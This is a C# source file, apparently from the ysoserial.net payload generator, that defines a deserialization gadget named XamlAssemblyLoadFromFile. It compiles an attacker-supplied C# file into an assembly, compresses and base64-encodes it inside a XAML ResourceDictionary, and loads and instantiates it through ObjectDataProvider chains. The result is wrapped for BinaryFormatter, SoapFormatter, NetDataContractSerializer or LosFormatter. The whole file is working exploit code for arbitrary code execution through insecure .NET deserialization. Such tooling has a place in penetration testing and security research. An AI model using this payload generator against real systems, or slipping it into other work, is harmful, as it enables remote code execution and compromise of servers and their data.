using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
   public class XamlAssemblyLoadFromFileGenerator : GenericGenerator
   {
      public override string Name()
      {
         return "XamlAssemblyLoadFromFile";
      }

      public override string AdditionalInfo()
      {
         return "Loads assembly using XAML. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
      }

      public override string Finders()
      {
         return "Soroush Dalili";
      }

      public override string Contributors()
      {
         return "russtone";
      }

      public override List<string> Labels()
      {
         return new List<string> { GadgetTypes.NotBridgeButDervied };
      }

      public override List<string> SupportedFormatters()
      {
         return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
      }

      int variant_number = 1;

      public override OptionSet Options()
      {
         OptionSet options = new OptionSet()
         {
            {"var|variant=", "Choices: 1 -> use TypeConfuseDelegateGenerator [default], 2 -> use TextFormattingRunPropertiesMarshal", v => int.TryParse(v, out variant_number) },
         };

         return options;
      }

      public override object Generate(string formatter, InputArgs inputArgs)
      {
         var files = inputArgs.Cmd;
         byte[] asmData = LocalCodeCompiler.CompileToAsmBytes(files);
         byte[] gzipAsmData = Gzip(asmData);
         string base64GzipAsmData = Convert.ToBase64String(gzipAsmData);
         

         var xmlResourceDict = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:s=""clr-namespace:System;assembly=mscorlib""
xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib""
xmlns:i=""clr-namespace:System.IO;assembly=mscorlib""
xmlns:c=""clr-namespace:System.IO.Compression;assembly=System""
>
   <s:Array x:Key=""data"" x:FactoryMethod=""s:Convert.FromBase64String"">
      <x:Arguments>
         <s:String>" + base64GzipAsmData + @"</s:String>
      </x:Arguments>
   </s:Array>
   <i:MemoryStream x:Key=""inputStream"">
      <x:Arguments>
         <StaticResource ResourceKey=""data""></StaticResource>
      </x:Arguments>
   </i:MemoryStream>
   <c:GZipStream x:Key=""gzipStream"">
      <x:Arguments>
            <StaticResource ResourceKey=""inputStream""></StaticResource>
            <c:CompressionMode>0</c:CompressionMode>
      </x:Arguments>
   </c:GZipStream>
   <s:Array x:Key=""buf"" x:FactoryMethod=""s:Array.CreateInstance"">
      <x:Arguments>
         <x:Type TypeName=""s:Byte""/>
         <x:Int32>" + asmData.Length + @"</x:Int32>
      </x:Arguments>
   </s:Array>
   <ObjectDataProvider x:Key=""tmp"" ObjectInstance=""{StaticResource gzipStream}"" MethodName=""Read"">
      <ObjectDataProvider.MethodParameters>
         <StaticResource ResourceKey=""buf""></StaticResource>
         <x:Int32>0</x:Int32>
         <x:Int32>" + asmData.Length + @"</x:Int32>
      </ObjectDataProvider.MethodParameters>
   </ObjectDataProvider>
    <ObjectDataProvider x:Key=""asmLoad"" ObjectType=""{x:Type r:Assembly}"" MethodName=""Load"">
        <ObjectDataProvider.MethodParameters>
            <StaticResource ResourceKey=""buf""></StaticResource>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""types"" ObjectInstance=""{StaticResource asmLoad}"" MethodName=""GetTypes"">
        <ObjectDataProvider.MethodParameters/>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""firstType"" ObjectInstance=""{StaticResource types}"" MethodName=""GetValue"">
        <ObjectDataProvider.MethodParameters>
            <s:Int32>0</s:Int32>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""createInstance"" ObjectInstance=""{StaticResource firstType}"" MethodName=""InvokeMember"">
        <ObjectDataProvider.MethodParameters>
            <x:Null/>
            <r:BindingFlags>512</r:BindingFlags>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

         if (inputArgs.Minify)
         {
            xmlResourceDict = XmlHelper.Minify(xmlResourceDict, null, null);
         }

         object obj;

         if (variant_number == 1)
         {
            obj = TypeConfuseDelegateGenerator.GetXamlGadget(xmlResourceDict);
         }
         else
         {
            obj = new TextFormattingRunPropertiesMarshal(xmlResourceDict);
         }

         return Serialize(obj, formatter, inputArgs);
      }

      private static byte[] Gzip(byte[] data)
      {
         var outputStream = new MemoryStream();
         var gzipStream = new GZipStream(outputStream, CompressionMode.Compress);
         gzipStream.Write(data, 0, data.Length);
         gzipStream.Close();
         var res = outputStream.ToArray();
         outputStream.Close();
         return res;
      }
   }
}
